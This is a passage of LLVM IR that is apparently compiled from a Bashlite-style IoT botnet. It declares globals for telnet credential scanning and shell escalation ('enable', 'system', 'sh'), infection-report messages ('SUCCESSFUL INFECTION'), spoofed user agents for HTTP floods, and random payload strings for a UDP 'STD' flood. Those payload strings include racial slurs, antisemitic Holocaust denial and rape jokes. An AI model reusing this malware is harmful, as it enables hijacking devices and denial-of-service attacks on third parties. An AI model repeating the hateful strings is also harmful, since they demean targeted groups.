@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.257, i32 0, i32 0), i8* null], align 16
@.str.262 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.263 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.264 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@legit = global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.265, i32 0, i32 0), i8* null], align 16
@.str.265 = private unnamed_addr constant [5 x i8] c"AK47\00", align 1
@infected = global [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.266, i32 0, i32 0), i8* null], align 16
@.str.266 = private unnamed_addr constant [8 x i8] c"LULZbOT\00", align 1
@UserAgents = local_unnamed_addr global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.302, i32 0, i32 0)], align 16
@.str.267 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.268 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.269 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.270 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.271 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.272 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.273 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.274 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.275 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.276 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.277 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.278 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.279 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.280 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.281 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.282 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.283 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.284 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.285 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.286 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.287 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.288 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.289 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.290 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.291 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.292 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.293 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.294 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.295 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.296 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.297 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.298 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.299 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.300 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.301 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.302 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@sleeptime = global i32 100, align 4
@pps = common global i32 0, align 4
@limiter = common global i32 0, align 4
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@head = common local_unnamed_addr global %struct.list* null, align 8
@tehport = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.303 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.492 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.304 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.305 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.306 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.307 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.308 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.309 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.310 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.311 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.312 = private unnamed_addr constant [3 x i8] c"80\00", align 1
@.str.313 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.314 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.315 = private unnamed_addr constant [19 x i8] c"REPORT %s:23 %s:%s\00", align 1
@.str.316 = private unnamed_addr constant [9 x i8] c"enable\0D\0A\00", align 1
@.str.317 = private unnamed_addr constant [9 x i8] c"system\0D\0A\00", align 1
@.str.318 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.319 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.320 = private unnamed_addr constant [27 x i8] c"echo -e '\5Cx41\5Cx4b\5Cx34\5Cx37'\00", align 1
@.str.321 = private unnamed_addr constant [35 x i8] c"SUCCESSFUL INFECTION ---> %s:%s:%s\00", align 1
@.str.322 = private unnamed_addr constant [31 x i8] c"FAILED TO INFECT ---> %s:%s:%s\00", align 1
@.str.323 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.324 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [78 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.327, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.331, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.341, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.344, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.345, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.346, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.347, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.348, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.349, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.350, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.386, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.387, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.388, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.389, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.390, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.401, i32 0, i32 0)], align 16
@.str.402 = private unnamed_addr constant [20 x i8] c"STD attacking %s:%s\00", align 1
@.str.325 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.326 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.327 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.328 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.329 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.330 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.331 = private unnamed_addr constant [10 x i8] c"tfw no gf\00", align 1
@.str.332 = private unnamed_addr constant [11 x i8] c"frienzoned\00", align 1
@.str.333 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.334 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.335 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"keksec\00", align 1
@.str.337 = private unnamed_addr constant [11 x i8] c"keksec rox\00", align 1
@.str.338 = private unnamed_addr constant [11 x i8] c"keksec ROX\00", align 1
@.str.339 = private unnamed_addr constant [10 x i8] c"get raped\00", align 1
@.str.340 = private unnamed_addr constant [18 x i8] c"not a ddos packet\00", align 1
@.str.341 = private unnamed_addr constant [23 x i8] c"also not a ddos packet\00", align 1
@.str.342 = private unnamed_addr constant [28 x i8] c"seriously not a ddos packet\00", align 1
@.str.343 = private unnamed_addr constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00", align 1
@.str.344 = private unnamed_addr constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00", align 1
@.str.345 = private unnamed_addr constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00", align 1
@.str.346 = private unnamed_addr constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00", align 1
@.str.347 = private unnamed_addr constant [16 x i8] c"8======D~~~~~~~\00", align 1
@.str.348 = private unnamed_addr constant [8 x i8] c"suck it\00", align 1
@.str.349 = private unnamed_addr constant [10 x i8] c"give succ\00", align 1
@.str.350 = private unnamed_addr constant [47 x i8] c"big nigger dick 8============================D\00", align 1
@.str.351 = private unnamed_addr constant [18 x i8] c"( . Y . ) tiddies\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"bigkek\00", align 1
@.str.353 = private unnamed_addr constant [13 x i8] c"eye pee rape\00", align 1
@.str.354 = private unnamed_addr constant [21 x i8] c"eye pee address rape\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"IP rape\00", align 1
@.str.356 = private unnamed_addr constant [13 x i8] c"This is LOIC\00", align 1
@.str.357 = private unnamed_addr constant [5 x i8] c"LOIC\00", align 1
@.str.358 = private unnamed_addr constant [5 x i8] c"HOIC\00", align 1
@.str.359 = private unnamed_addr constant [5 x i8] c"XOIC\00", align 1
@.str.360 = private unnamed_addr constant [7 x i8] c"LHXOIC\00", align 1
@.str.361 = private unnamed_addr constant [33 x i8] c"A cat is fine too. Desudesudesu~\00", align 1
@.str.362 = private unnamed_addr constant [18 x i8] c"the biiiiig pussy\00", align 1
@.str.363 = private unnamed_addr constant [6 x i8] c"benis\00", align 1
@.str.364 = private unnamed_addr constant [6 x i8] c"penis\00", align 1
@.str.365 = private unnamed_addr constant [5 x i8] c"dick\00", align 1
@.str.366 = private unnamed_addr constant [7 x i8] c"vagina\00", align 1
@.str.367 = private unnamed_addr constant [9 x i8] c"clitoris\00", align 1
@.str.368 = private unnamed_addr constant [6 x i8] c"pussy\00", align 1
@.str.369 = private unnamed_addr constant [4 x i8] c"tfw\00", align 1
@.str.370 = private unnamed_addr constant [4 x i8] c":^}\00", align 1
@.str.371 = private unnamed_addr constant [9 x i8] c"dic pic?\00", align 1
@.str.372 = private unnamed_addr constant [11 x i8] c"send nudes\00", align 1
@.str.373 = private unnamed_addr constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00", align 1
@.str.374 = private unnamed_addr constant [24 x i8] c"Never gonna give you up\00", align 1
@.str.375 = private unnamed_addr constant [25 x i8] c"Never gonna make you cry\00", align 1
@.str.376 = private unnamed_addr constant [24 x i8] c"Never gonna let you die\00", align 1
@.str.377 = private unnamed_addr constant [21 x i8] c"Never gonna hurt you\00", align 1
@.str.378 = private unnamed_addr constant [14 x i8] c"bush did 9/11\00", align 1
@.str.379 = private unnamed_addr constant [32 x i8] c"jet fuel can't melt steel beams\00", align 1
@.str.380 = private unnamed_addr constant [23 x i8] c"9/11 was an inside job\00", align 1
@.str.381 = private unnamed_addr constant [23 x i8] c"the illuminati is real\00", align 1
@.str.382 = private unnamed_addr constant [14 x i8] c"wake up sheep\00", align 1
@.str.383 = private unnamed_addr constant [22 x i8] c"i flex like david ike\00", align 1
@.str.384 = private unnamed_addr constant [35 x i8] c"6 million jews? show me the proof!\00", align 1
@.str.385 = private unnamed_addr constant [18 x i8] c"T R I G G E R E D\00", align 1
@.str.386 = private unnamed_addr constant [22 x i8] c"free masons suck cock\00", align 1
@.str.387 = private unnamed_addr constant [10 x i8] c"ihatejews\00", align 1
@.str.388 = private unnamed_addr constant [6 x i8] c"urgay\00", align 1
@.str.389 = private unnamed_addr constant [16 x i8] c"tfw u like dick\00", align 1
@.str.390 = private unnamed_addr constant [9 x i8] c"dickbutt\00", align 1
@.str.391 = private unnamed_addr constant [20 x i8] c"The elusive dickbut\00", align 1
@.str.392 = private unnamed_addr constant [27 x i8] c"Heyyy that's pretty gooood\00", align 1
@.str.393 = private unnamed_addr constant [15 x i8] c"NSA sucks cock\00", align 1
@.str.394 = private unnamed_addr constant [15 x i8] c"FBI sucks cock\00", align 1
@.str.395 = private unnamed_addr constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00", align 1
@.str.396 = private unnamed_addr constant [28 x i8] c"Oh yeah I like nulling shit\00", align 1
@.str.397 = private unnamed_addr constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00", align 1
@.str.398 = private unnamed_addr constant [28 x i8] c"Keemstar is a fucking knome\00", align 1
@.str.399 = private unnamed_addr constant [17 x i8] c"Leafy is gawd <3\00", align 1
@.str.400 = private unnamed_addr constant [25 x i8] c"Ourmine is full of skids\00", align 1
@.str.401 = private unnamed_addr constant [20 x i8] c"STC is the greatest\00", align 1
@.str.403 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
